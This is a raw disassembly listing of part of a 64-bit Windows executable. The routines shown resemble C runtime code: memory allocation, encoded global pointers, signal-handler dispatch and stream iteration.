   14000b0ef:	48 85 f6             	test   %rsi,%rsi
   14000b0f2:	74 0a                	je     0x14000b0fe
   14000b0f4:	e8 97 1f 00 00       	call   0x14000d090
   14000b0f9:	48 8b f8             	mov    %rax,%rdi
   14000b0fc:	eb 02                	jmp    0x14000b100
   14000b0fe:	33 ff                	xor    %edi,%edi
   14000b100:	48 0f af dd          	imul   %rbp,%rbx
   14000b104:	48 8b ce             	mov    %rsi,%rcx
   14000b107:	48 8b d3             	mov    %rbx,%rdx
   14000b10a:	e8 d1 1f 00 00       	call   0x14000d0e0
   14000b10f:	48 8b f0             	mov    %rax,%rsi
   14000b112:	48 85 c0             	test   %rax,%rax
   14000b115:	74 16                	je     0x14000b12d
   14000b117:	48 3b fb             	cmp    %rbx,%rdi
   14000b11a:	73 11                	jae    0x14000b12d
   14000b11c:	48 2b df             	sub    %rdi,%rbx
   14000b11f:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   14000b123:	4c 8b c3             	mov    %rbx,%r8
   14000b126:	33 d2                	xor    %edx,%edx
   14000b128:	e8 d3 3f 00 00       	call   0x14000f100
   14000b12d:	48 8b c6             	mov    %rsi,%rax
   14000b130:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b135:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000b13a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000b13f:	48 83 c4 20          	add    $0x20,%rsp
   14000b143:	5f                   	pop    %rdi
   14000b144:	c3                   	ret
   14000b145:	cc                   	int3
   14000b146:	cc                   	int3
   14000b147:	cc                   	int3
   14000b148:	cc                   	int3
   14000b149:	cc                   	int3
   14000b14a:	cc                   	int3
   14000b14b:	cc                   	int3
   14000b14c:	cc                   	int3
   14000b14d:	cc                   	int3
   14000b14e:	cc                   	int3
   14000b14f:	cc                   	int3
   14000b150:	e9 5b ff ff ff       	jmp    0x14000b0b0
   14000b155:	cc                   	int3
   14000b156:	cc                   	int3
   14000b157:	cc                   	int3
   14000b158:	cc                   	int3
   14000b159:	cc                   	int3
   14000b15a:	cc                   	int3
   14000b15b:	cc                   	int3
   14000b15c:	cc                   	int3
   14000b15d:	cc                   	int3
   14000b15e:	cc                   	int3
   14000b15f:	cc                   	int3
   14000b160:	48 8b 05 d9 44 01 00 	mov    0x144d9(%rip),%rax        # 0x14001f640
   14000b167:	c3                   	ret
   14000b168:	cc                   	int3
   14000b169:	cc                   	int3
   14000b16a:	cc                   	int3
   14000b16b:	cc                   	int3
   14000b16c:	cc                   	int3
   14000b16d:	cc                   	int3
   14000b16e:	cc                   	int3
   14000b16f:	cc                   	int3
   14000b170:	48 83 ec 28          	sub    $0x28,%rsp
   14000b174:	ff 15 9e 50 00 00    	call   *0x509e(%rip)        # 0x140010218
   14000b17a:	48 85 c0             	test   %rax,%rax
   14000b17d:	48 89 05 bc 44 01 00 	mov    %rax,0x144bc(%rip)        # 0x14001f640
   14000b184:	0f 95 c0             	setne  %al
   14000b187:	48 83 c4 28          	add    $0x28,%rsp
   14000b18b:	c3                   	ret
   14000b18c:	cc                   	int3
   14000b18d:	cc                   	int3
   14000b18e:	cc                   	int3
   14000b18f:	cc                   	int3
   14000b190:	cc                   	int3
   14000b191:	cc                   	int3
   14000b192:	cc                   	int3
   14000b193:	cc                   	int3
   14000b194:	cc                   	int3
   14000b195:	cc                   	int3
   14000b196:	cc                   	int3
   14000b197:	cc                   	int3
   14000b198:	cc                   	int3
   14000b199:	cc                   	int3
   14000b19a:	cc                   	int3
   14000b19b:	cc                   	int3
   14000b19c:	cc                   	int3
   14000b19d:	cc                   	int3
   14000b19e:	cc                   	int3
   14000b19f:	cc                   	int3
   14000b1a0:	48 83 25 98 44 01 00 	andq   $0x0,0x14498(%rip)        # 0x14001f640
   14000b1a7:	00 
   14000b1a8:	b0 01                	mov    $0x1,%al
   14000b1aa:	c3                   	ret
   14000b1ab:	cc                   	int3
   14000b1ac:	cc                   	int3
   14000b1ad:	cc                   	int3
   14000b1ae:	cc                   	int3
   14000b1af:	cc                   	int3
   14000b1b0:	cc                   	int3
   14000b1b1:	cc                   	int3
   14000b1b2:	cc                   	int3
   14000b1b3:	cc                   	int3
   14000b1b4:	cc                   	int3
   14000b1b5:	cc                   	int3
   14000b1b6:	cc                   	int3
   14000b1b7:	cc                   	int3
   14000b1b8:	cc                   	int3
   14000b1b9:	cc                   	int3
   14000b1ba:	cc                   	int3
   14000b1bb:	cc                   	int3
   14000b1bc:	cc                   	int3
   14000b1bd:	cc                   	int3
   14000b1be:	cc                   	int3
   14000b1bf:	cc                   	int3
   14000b1c0:	48 8b 05 79 44 01 00 	mov    0x14479(%rip),%rax        # 0x14001f640
   14000b1c7:	c3                   	ret
   14000b1c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b1cd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b1d2:	57                   	push   %rdi
   14000b1d3:	48 83 ec 20          	sub    $0x20,%rsp
   14000b1d7:	48 8b f2             	mov    %rdx,%rsi
   14000b1da:	48 8b f9             	mov    %rcx,%rdi
   14000b1dd:	48 3b ca             	cmp    %rdx,%rcx
   14000b1e0:	74 52                	je     0x14000b234
   14000b1e2:	48 8b d9             	mov    %rcx,%rbx
   14000b1e5:	48 8b 03             	mov    (%rbx),%rax
   14000b1e8:	48 85 c0             	test   %rax,%rax
   14000b1eb:	74 09                	je     0x14000b1f6
   14000b1ed:	e8 1e 38 00 00       	call   0x14000ea10
   14000b1f2:	84 c0                	test   %al,%al
   14000b1f4:	74 09                	je     0x14000b1ff
   14000b1f6:	48 83 c3 10          	add    $0x10,%rbx
   14000b1fa:	48 3b de             	cmp    %rsi,%rbx
   14000b1fd:	75 e6                	jne    0x14000b1e5
   14000b1ff:	48 3b de             	cmp    %rsi,%rbx
   14000b202:	74 30                	je     0x14000b234
   14000b204:	48 3b df             	cmp    %rdi,%rbx
   14000b207:	74 27                	je     0x14000b230
   14000b209:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   14000b20d:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   14000b212:	74 0f                	je     0x14000b223
   14000b214:	48 8b 03             	mov    (%rbx),%rax
   14000b217:	48 85 c0             	test   %rax,%rax
   14000b21a:	74 07                	je     0x14000b223
   14000b21c:	33 c9                	xor    %ecx,%ecx
   14000b21e:	e8 ed 37 00 00       	call   0x14000ea10
   14000b223:	48 83 eb 10          	sub    $0x10,%rbx
   14000b227:	48 8d 43 08          	lea    0x8(%rbx),%rax
   14000b22b:	48 3b c7             	cmp    %rdi,%rax
   14000b22e:	75 dd                	jne    0x14000b20d
   14000b230:	32 c0                	xor    %al,%al
   14000b232:	eb 02                	jmp    0x14000b236
   14000b234:	b0 01                	mov    $0x1,%al
   14000b236:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b23b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000b240:	48 83 c4 20          	add    $0x20,%rsp
   14000b244:	5f                   	pop    %rdi
   14000b245:	c3                   	ret
   14000b246:	cc                   	int3
   14000b247:	cc                   	int3
   14000b248:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b24d:	57                   	push   %rdi
   14000b24e:	48 83 ec 20          	sub    $0x20,%rsp
   14000b252:	48 8b da             	mov    %rdx,%rbx
   14000b255:	48 8b f9             	mov    %rcx,%rdi
   14000b258:	48 3b ca             	cmp    %rdx,%rcx
   14000b25b:	74 19                	je     0x14000b276
   14000b25d:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   14000b261:	48 85 c0             	test   %rax,%rax
   14000b264:	74 07                	je     0x14000b26d
   14000b266:	33 c9                	xor    %ecx,%ecx
   14000b268:	e8 a3 37 00 00       	call   0x14000ea10
   14000b26d:	48 83 eb 10          	sub    $0x10,%rbx
   14000b271:	48 3b df             	cmp    %rdi,%rbx
   14000b274:	75 e7                	jne    0x14000b25d
   14000b276:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b27b:	b0 01                	mov    $0x1,%al
   14000b27d:	48 83 c4 20          	add    $0x20,%rsp
   14000b281:	5f                   	pop    %rdi
   14000b282:	c3                   	ret
   14000b283:	cc                   	int3
   14000b284:	cc                   	int3
   14000b285:	cc                   	int3
   14000b286:	cc                   	int3
   14000b287:	cc                   	int3
   14000b288:	cc                   	int3
   14000b289:	cc                   	int3
   14000b28a:	cc                   	int3
   14000b28b:	cc                   	int3
   14000b28c:	cc                   	int3
   14000b28d:	cc                   	int3
   14000b28e:	cc                   	int3
   14000b28f:	cc                   	int3
   14000b290:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b295:	57                   	push   %rdi
   14000b296:	48 83 ec 20          	sub    $0x20,%rsp
   14000b29a:	48 8b f9             	mov    %rcx,%rdi
   14000b29d:	e8 3e 00 00 00       	call   0x14000b2e0
   14000b2a2:	33 db                	xor    %ebx,%ebx
   14000b2a4:	48 85 c0             	test   %rax,%rax
   14000b2a7:	74 0f                	je     0x14000b2b8
   14000b2a9:	48 8b cf             	mov    %rdi,%rcx
   14000b2ac:	e8 5f 37 00 00       	call   0x14000ea10
   14000b2b1:	85 c0                	test   %eax,%eax
   14000b2b3:	0f 95 c3             	setne  %bl
   14000b2b6:	8b c3                	mov    %ebx,%eax
   14000b2b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b2bd:	48 83 c4 20          	add    $0x20,%rsp
   14000b2c1:	5f                   	pop    %rdi
   14000b2c2:	c3                   	ret
   14000b2c3:	cc                   	int3
   14000b2c4:	cc                   	int3
   14000b2c5:	cc                   	int3
   14000b2c6:	cc                   	int3
   14000b2c7:	cc                   	int3
   14000b2c8:	cc                   	int3
   14000b2c9:	cc                   	int3
   14000b2ca:	cc                   	int3
   14000b2cb:	cc                   	int3
   14000b2cc:	cc                   	int3
   14000b2cd:	cc                   	int3
   14000b2ce:	cc                   	int3
   14000b2cf:	cc                   	int3
   14000b2d0:	48 89 0d 71 43 01 00 	mov    %rcx,0x14371(%rip)        # 0x14001f648
   14000b2d7:	c3                   	ret
   14000b2d8:	cc                   	int3
   14000b2d9:	cc                   	int3
   14000b2da:	cc                   	int3
   14000b2db:	cc                   	int3
   14000b2dc:	cc                   	int3
   14000b2dd:	cc                   	int3
   14000b2de:	cc                   	int3
   14000b2df:	cc                   	int3
   14000b2e0:	40 53                	rex push %rbx
   14000b2e2:	48 83 ec 20          	sub    $0x20,%rsp
   14000b2e6:	33 c9                	xor    %ecx,%ecx
   14000b2e8:	e8 a3 e9 ff ff       	call   0x140009c90
   14000b2ed:	90                   	nop
   14000b2ee:	48 8b 05 0b 2d 01 00 	mov    0x12d0b(%rip),%rax        # 0x14001e000
   14000b2f5:	8b c8                	mov    %eax,%ecx
   14000b2f7:	83 e1 3f             	and    $0x3f,%ecx
   14000b2fa:	48 8b 1d 47 43 01 00 	mov    0x14347(%rip),%rbx        # 0x14001f648
   14000b301:	48 33 d8             	xor    %rax,%rbx
   14000b304:	48 d3 cb             	ror    %cl,%rbx
   14000b307:	33 c9                	xor    %ecx,%ecx
   14000b309:	e8 d6 e9 ff ff       	call   0x140009ce4
   14000b30e:	48 8b c3             	mov    %rbx,%rax
   14000b311:	48 83 c4 20          	add    $0x20,%rsp
   14000b315:	5b                   	pop    %rbx
   14000b316:	c3                   	ret
   14000b317:	cc                   	int3
   14000b318:	cc                   	int3
   14000b319:	cc                   	int3
   14000b31a:	cc                   	int3
   14000b31b:	cc                   	int3
   14000b31c:	cc                   	int3
   14000b31d:	cc                   	int3
   14000b31e:	cc                   	int3
   14000b31f:	cc                   	int3
   14000b320:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b325:	57                   	push   %rdi
   14000b326:	48 83 ec 20          	sub    $0x20,%rsp
   14000b32a:	48 8b f9             	mov    %rcx,%rdi
   14000b32d:	33 c9                	xor    %ecx,%ecx
   14000b32f:	e8 5c e9 ff ff       	call   0x140009c90
   14000b334:	90                   	nop
   14000b335:	48 8b 15 c4 2c 01 00 	mov    0x12cc4(%rip),%rdx        # 0x14001e000
   14000b33c:	8b c2                	mov    %edx,%eax
   14000b33e:	83 e0 3f             	and    $0x3f,%eax
   14000b341:	48 8b da             	mov    %rdx,%rbx
   14000b344:	48 33 1d fd 42 01 00 	xor    0x142fd(%rip),%rbx        # 0x14001f648
   14000b34b:	8b c8                	mov    %eax,%ecx
   14000b34d:	48 d3 cb             	ror    %cl,%rbx
   14000b350:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000b355:	2b c8                	sub    %eax,%ecx
   14000b357:	48 d3 cf             	ror    %cl,%rdi
   14000b35a:	48 33 fa             	xor    %rdx,%rdi
   14000b35d:	48 89 3d e4 42 01 00 	mov    %rdi,0x142e4(%rip)        # 0x14001f648
   14000b364:	33 c9                	xor    %ecx,%ecx
   14000b366:	e8 79 e9 ff ff       	call   0x140009ce4
   14000b36b:	48 8b c3             	mov    %rbx,%rax
   14000b36e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b373:	48 83 c4 20          	add    $0x20,%rsp
   14000b377:	5f                   	pop    %rdi
   14000b378:	c3                   	ret
   14000b379:	cc                   	int3
   14000b37a:	cc                   	int3
   14000b37b:	cc                   	int3
   14000b37c:	cc                   	int3
   14000b37d:	cc                   	int3
   14000b37e:	cc                   	int3
   14000b37f:	cc                   	int3
   14000b380:	48 8b 0d 79 2c 01 00 	mov    0x12c79(%rip),%rcx        # 0x14001e000
   14000b387:	e9 94 ff ff ff       	jmp    0x14000b320
   14000b38c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b391:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000b396:	57                   	push   %rdi
   14000b397:	48 83 ec 20          	sub    $0x20,%rsp
   14000b39b:	49 8b f9             	mov    %r9,%rdi
   14000b39e:	8b 0a                	mov    (%rdx),%ecx
   14000b3a0:	e8 eb e8 ff ff       	call   0x140009c90
   14000b3a5:	90                   	nop
   14000b3a6:	48 8b 05 53 2c 01 00 	mov    0x12c53(%rip),%rax        # 0x14001e000
   14000b3ad:	8b c8                	mov    %eax,%ecx
   14000b3af:	83 e1 3f             	and    $0x3f,%ecx
   14000b3b2:	48 8b 1d a7 42 01 00 	mov    0x142a7(%rip),%rbx        # 0x14001f660
   14000b3b9:	48 33 d8             	xor    %rax,%rbx
   14000b3bc:	48 d3 cb             	ror    %cl,%rbx
   14000b3bf:	8b 0f                	mov    (%rdi),%ecx
   14000b3c1:	e8 1e e9 ff ff       	call   0x140009ce4
   14000b3c6:	48 8b c3             	mov    %rbx,%rax
   14000b3c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b3ce:	48 83 c4 20          	add    $0x20,%rsp
   14000b3d2:	5f                   	pop    %rdi
   14000b3d3:	c3                   	ret
   14000b3d4:	4c 8b dc             	mov    %rsp,%r11
   14000b3d7:	48 83 ec 28          	sub    $0x28,%rsp
   14000b3db:	b8 03 00 00 00       	mov    $0x3,%eax
   14000b3e0:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   14000b3e4:	4d 8d 43 08          	lea    0x8(%r11),%r8
   14000b3e8:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000b3ec:	49 8d 53 18          	lea    0x18(%r11),%rdx
   14000b3f0:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000b3f4:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   14000b3f8:	e8 8f ff ff ff       	call   0x14000b38c
   14000b3fd:	48 83 c4 28          	add    $0x28,%rsp
   14000b401:	c3                   	ret
   14000b402:	cc                   	int3
   14000b403:	cc                   	int3
   14000b404:	48 89 0d 45 42 01 00 	mov    %rcx,0x14245(%rip)        # 0x14001f650
   14000b40b:	48 89 0d 46 42 01 00 	mov    %rcx,0x14246(%rip)        # 0x14001f658
   14000b412:	48 89 0d 47 42 01 00 	mov    %rcx,0x14247(%rip)        # 0x14001f660
   14000b419:	48 89 0d 48 42 01 00 	mov    %rcx,0x14248(%rip)        # 0x14001f668
   14000b420:	c3                   	ret
   14000b421:	cc                   	int3
   14000b422:	cc                   	int3
   14000b423:	cc                   	int3
   14000b424:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000b429:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000b42e:	57                   	push   %rdi
   14000b42f:	41 54                	push   %r12
   14000b431:	41 55                	push   %r13
   14000b433:	41 56                	push   %r14
   14000b435:	41 57                	push   %r15
   14000b437:	48 83 ec 40          	sub    $0x40,%rsp
   14000b43b:	8b d9                	mov    %ecx,%ebx
   14000b43d:	45 33 ff             	xor    %r15d,%r15d
   14000b440:	44 21 7c 24 78       	and    %r15d,0x78(%rsp)
   14000b445:	41 b6 01             	mov    $0x1,%r14b
   14000b448:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   14000b44d:	8b d1                	mov    %ecx,%edx
   14000b44f:	83 ea 02             	sub    $0x2,%edx
   14000b452:	74 27                	je     0x14000b47b
   14000b454:	83 ea 02             	sub    $0x2,%edx
   14000b457:	74 52                	je     0x14000b4ab
   14000b459:	83 ea 02             	sub    $0x2,%edx
   14000b45c:	74 1d                	je     0x14000b47b
   14000b45e:	83 ea 02             	sub    $0x2,%edx
   14000b461:	74 48                	je     0x14000b4ab
   14000b463:	83 ea 03             	sub    $0x3,%edx
   14000b466:	74 43                	je     0x14000b4ab
   14000b468:	83 ea 04             	sub    $0x4,%edx
   14000b46b:	74 0e                	je     0x14000b47b
   14000b46d:	83 ea 06             	sub    $0x6,%edx
   14000b470:	74 09                	je     0x14000b47b
   14000b472:	83 fa 01             	cmp    $0x1,%edx
   14000b475:	0f 85 82 00 00 00    	jne    0x14000b4fd
   14000b47b:	83 e9 02             	sub    $0x2,%ecx
   14000b47e:	0f 84 b4 00 00 00    	je     0x14000b538
   14000b484:	83 e9 04             	sub    $0x4,%ecx
   14000b487:	0f 84 90 00 00 00    	je     0x14000b51d
   14000b48d:	83 e9 09             	sub    $0x9,%ecx
   14000b490:	0f 84 99 00 00 00    	je     0x14000b52f
   14000b496:	83 e9 06             	sub    $0x6,%ecx
   14000b499:	0f 84 87 00 00 00    	je     0x14000b526
   14000b49f:	83 f9 01             	cmp    $0x1,%ecx
   14000b4a2:	74 79                	je     0x14000b51d
   14000b4a4:	33 ff                	xor    %edi,%edi
   14000b4a6:	e9 94 00 00 00       	jmp    0x14000b53f
   14000b4ab:	e8 30 c4 ff ff       	call   0x1400078e0
   14000b4b0:	4c 8b f8             	mov    %rax,%r15
   14000b4b3:	48 85 c0             	test   %rax,%rax
   14000b4b6:	75 1d                	jne    0x14000b4d5
   14000b4b8:	83 c8 ff             	or     $0xffffffff,%eax
   14000b4bb:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   14000b4c0:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   14000b4c4:	49 8b 73 48          	mov    0x48(%r11),%rsi
   14000b4c8:	49 8b e3             	mov    %r11,%rsp
   14000b4cb:	41 5f                	pop    %r15
   14000b4cd:	41 5e                	pop    %r14
   14000b4cf:	41 5d                	pop    %r13
   14000b4d1:	41 5c                	pop    %r12
   14000b4d3:	5f                   	pop    %rdi
   14000b4d4:	c3                   	ret
   14000b4d5:	48 8b 00             	mov    (%rax),%rax
   14000b4d8:	48 8b 0d c1 68 00 00 	mov    0x68c1(%rip),%rcx        # 0x140011da0
   14000b4df:	48 c1 e1 04          	shl    $0x4,%rcx
   14000b4e3:	48 03 c8             	add    %rax,%rcx
   14000b4e6:	eb 09                	jmp    0x14000b4f1
   14000b4e8:	39 58 04             	cmp    %ebx,0x4(%rax)
   14000b4eb:	74 0b                	je     0x14000b4f8
   14000b4ed:	48 83 c0 10          	add    $0x10,%rax
   14000b4f1:	48 3b c1             	cmp    %rcx,%rax
   14000b4f4:	75 f2                	jne    0x14000b4e8
   14000b4f6:	33 c0                	xor    %eax,%eax
   14000b4f8:	48 85 c0             	test   %rax,%rax
   14000b4fb:	75 12                	jne    0x14000b50f
   14000b4fd:	e8 6a ca ff ff       	call   0x140007f6c
   14000b502:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b508:	e8 b7 c8 ff ff       	call   0x140007dc4
   14000b50d:	eb a9                	jmp    0x14000b4b8
   14000b50f:	48 8d 78 08          	lea    0x8(%rax),%rdi
   14000b513:	45 32 f6             	xor    %r14b,%r14b
   14000b516:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   14000b51b:	eb 22                	jmp    0x14000b53f
   14000b51d:	48 8d 3d 3c 41 01 00 	lea    0x1413c(%rip),%rdi        # 0x14001f660
   14000b524:	eb 19                	jmp    0x14000b53f
   14000b526:	48 8d 3d 2b 41 01 00 	lea    0x1412b(%rip),%rdi        # 0x14001f658
   14000b52d:	eb 10                	jmp    0x14000b53f
   14000b52f:	48 8d 3d 32 41 01 00 	lea    0x14132(%rip),%rdi        # 0x14001f668
   14000b536:	eb 07                	jmp    0x14000b53f
   14000b538:	48 8d 3d 11 41 01 00 	lea    0x14111(%rip),%rdi        # 0x14001f650
   14000b53f:	45 33 ed             	xor    %r13d,%r13d
   14000b542:	45 84 f6             	test   %r14b,%r14b
   14000b545:	74 0a                	je     0x14000b551
   14000b547:	41 8d 4d 03          	lea    0x3(%r13),%ecx
   14000b54b:	e8 40 e7 ff ff       	call   0x140009c90
   14000b550:	90                   	nop
   14000b551:	48 8b 37             	mov    (%rdi),%rsi
   14000b554:	45 84 f6             	test   %r14b,%r14b
   14000b557:	74 12                	je     0x14000b56b
   14000b559:	48 8b 05 a0 2a 01 00 	mov    0x12aa0(%rip),%rax        # 0x14001e000
   14000b560:	8b c8                	mov    %eax,%ecx
   14000b562:	83 e1 3f             	and    $0x3f,%ecx
   14000b565:	48 33 f0             	xor    %rax,%rsi
   14000b568:	48 d3 ce             	ror    %cl,%rsi
   14000b56b:	48 83 fe 01          	cmp    $0x1,%rsi
   14000b56f:	0f 84 8b 00 00 00    	je     0x14000b600
   14000b575:	48 85 f6             	test   %rsi,%rsi
   14000b578:	0f 84 e9 00 00 00    	je     0x14000b667
   14000b57e:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000b584:	83 fb 0b             	cmp    $0xb,%ebx
   14000b587:	77 35                	ja     0x14000b5be
   14000b589:	41 0f a3 dc          	bt     %ebx,%r12d
   14000b58d:	73 2f                	jae    0x14000b5be
   14000b58f:	4d 8b 6f 08          	mov    0x8(%r15),%r13
   14000b593:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000b598:	49 83 67 08 00       	andq   $0x0,0x8(%r15)
   14000b59d:	83 fb 08             	cmp    $0x8,%ebx
   14000b5a0:	75 52                	jne    0x14000b5f4
   14000b5a2:	e8 d9 c2 ff ff       	call   0x140007880
   14000b5a7:	8b 40 10             	mov    0x10(%rax),%eax
   14000b5aa:	89 44 24 78          	mov    %eax,0x78(%rsp)
   14000b5ae:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000b5b2:	e8 c9 c2 ff ff       	call   0x140007880
   14000b5b7:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   14000b5be:	83 fb 08             	cmp    $0x8,%ebx
   14000b5c1:	75 31                	jne    0x14000b5f4
   14000b5c3:	48 8b 05 de 67 00 00 	mov    0x67de(%rip),%rax        # 0x140011da8
   14000b5ca:	48 c1 e0 04          	shl    $0x4,%rax
   14000b5ce:	49 03 07             	add    (%r15),%rax
   14000b5d1:	48 8b 0d d8 67 00 00 	mov    0x67d8(%rip),%rcx        # 0x140011db0
   14000b5d8:	48 c1 e1 04          	shl    $0x4,%rcx
   14000b5dc:	48 03 c8             	add    %rax,%rcx
   14000b5df:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000b5e4:	48 3b c1             	cmp    %rcx,%rax
   14000b5e7:	74 1d                	je     0x14000b606
   14000b5e9:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   14000b5ee:	48 83 c0 10          	add    $0x10,%rax
   14000b5f2:	eb eb                	jmp    0x14000b5df
   14000b5f4:	48 8b 05 05 2a 01 00 	mov    0x12a05(%rip),%rax        # 0x14001e000
   14000b5fb:	48 89 07             	mov    %rax,(%rdi)
   14000b5fe:	eb 06                	jmp    0x14000b606
   14000b600:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000b606:	45 84 f6             	test   %r14b,%r14b
   14000b609:	74 0a                	je     0x14000b615
   14000b60b:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000b610:	e8 cf e6 ff ff       	call   0x140009ce4
   14000b615:	48 83 fe 01          	cmp    $0x1,%rsi
   14000b619:	75 07                	jne    0x14000b622
   14000b61b:	33 c0                	xor    %eax,%eax
   14000b61d:	e9 99 fe ff ff       	jmp    0x14000b4bb
   14000b622:	83 fb 08             	cmp    $0x8,%ebx
   14000b625:	75 14                	jne    0x14000b63b
   14000b627:	e8 54 c2 ff ff       	call   0x140007880
   14000b62c:	8b 50 10             	mov    0x10(%rax),%edx
   14000b62f:	8b cb                	mov    %ebx,%ecx
   14000b631:	48 8b c6             	mov    %rsi,%rax
   14000b634:	e8 d7 33 00 00       	call   0x14000ea10
   14000b639:	eb 0a                	jmp    0x14000b645
   14000b63b:	8b cb                	mov    %ebx,%ecx
   14000b63d:	48 8b c6             	mov    %rsi,%rax
   14000b640:	e8 cb 33 00 00       	call   0x14000ea10
   14000b645:	83 fb 0b             	cmp    $0xb,%ebx
   14000b648:	77 d1                	ja     0x14000b61b
   14000b64a:	41 0f a3 dc          	bt     %ebx,%r12d
   14000b64e:	73 cb                	jae    0x14000b61b
   14000b650:	4d 89 6f 08          	mov    %r13,0x8(%r15)
   14000b654:	83 fb 08             	cmp    $0x8,%ebx
   14000b657:	75 c2                	jne    0x14000b61b
   14000b659:	e8 22 c2 ff ff       	call   0x140007880
   14000b65e:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000b662:	89 48 10             	mov    %ecx,0x10(%rax)
   14000b665:	eb b4                	jmp    0x14000b61b
   14000b667:	45 84 f6             	test   %r14b,%r14b
   14000b66a:	74 08                	je     0x14000b674
   14000b66c:	8d 4e 03             	lea    0x3(%rsi),%ecx
   14000b66f:	e8 70 e6 ff ff       	call   0x140009ce4
   14000b674:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000b679:	e8 46 b4 ff ff       	call   0x140006ac4
   14000b67e:	90                   	nop
   14000b67f:	cc                   	int3
   14000b680:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b685:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000b68a:	57                   	push   %rdi
   14000b68b:	48 83 ec 20          	sub    $0x20,%rsp
   14000b68f:	49 8b f9             	mov    %r9,%rdi
   14000b692:	49 8b d8             	mov    %r8,%rbx
   14000b695:	48 8b 0a             	mov    (%rdx),%rcx
   14000b698:	e8 a7 04 00 00       	call   0x14000bb44
   14000b69d:	90                   	nop
   14000b69e:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000b6a2:	48 8b 03             	mov    (%rbx),%rax
   14000b6a5:	48 8b 08             	mov    (%rax),%rcx
   14000b6a8:	48 85 c9             	test   %rcx,%rcx
   14000b6ab:	74 5c                	je     0x14000b709
   14000b6ad:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000b6b0:	90                   	nop
   14000b6b1:	8b c1                	mov    %ecx,%eax
   14000b6b3:	c1 e8 0d             	shr    $0xd,%eax
   14000b6b6:	a8 01                	test   $0x1,%al
   14000b6b8:	74 4f                	je     0x14000b709
   14000b6ba:	8b c1                	mov    %ecx,%eax
   14000b6bc:	24 03                	and    $0x3,%al
   14000b6be:	3c 02                	cmp    $0x2,%al
   14000b6c0:	75 05                	jne    0x14000b6c7
   14000b6c2:	f6 c1 c0             	test   $0xc0,%cl
   14000b6c5:	75 0a                	jne    0x14000b6d1
   14000b6c7:	0f ba e1 0b          	bt     $0xb,%ecx
   14000b6cb:	72 04                	jb     0x14000b6d1
   14000b6cd:	ff 02                	incl   (%rdx)
   14000b6cf:	eb 38                	jmp    0x14000b709
   14000b6d1:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000b6d5:	80 38 00             	cmpb   $0x0,(%rax)
   14000b6d8:	75 10                	jne    0x14000b6ea
   14000b6da:	48 8b 03             	mov    (%rbx),%rax
   14000b6dd:	48 8b 08             	mov    (%rax),%rcx
   14000b6e0:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b6e3:	90                   	nop
   14000b6e4:	d1 e8                	shr    $1,%eax
   14000b6e6:	a8 01                	test   $0x1,%al
   14000b6e8:	74 1f                	je     0x14000b709
   14000b6ea:	48 8b 0b             	mov    (%rbx),%rcx
   14000b6ed:	48 8b 09             	mov    (%rcx),%rcx
   14000b6f0:	e8 f7 01 00 00       	call   0x14000b8ec
   14000b6f5:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000b6f8:	74 08                	je     0x14000b702
   14000b6fa:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000b6fe:	ff 00                	incl   (%rax)
   14000b700:	eb 07                	jmp    0x14000b709
   14000b702:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000b706:	83 08 ff             	orl    $0xffffffff,(%rax)
   14000b709:	48 8b 0f             	mov    (%rdi),%rcx
   14000b70c:	e8 3f 04 00 00       	call   0x14000bb50
   14000b711:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b716:	48 83 c4 20          	add    $0x20,%rsp
   14000b71a:	5f                   	pop    %rdi
   14000b71b:	c3                   	ret
   14000b71c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
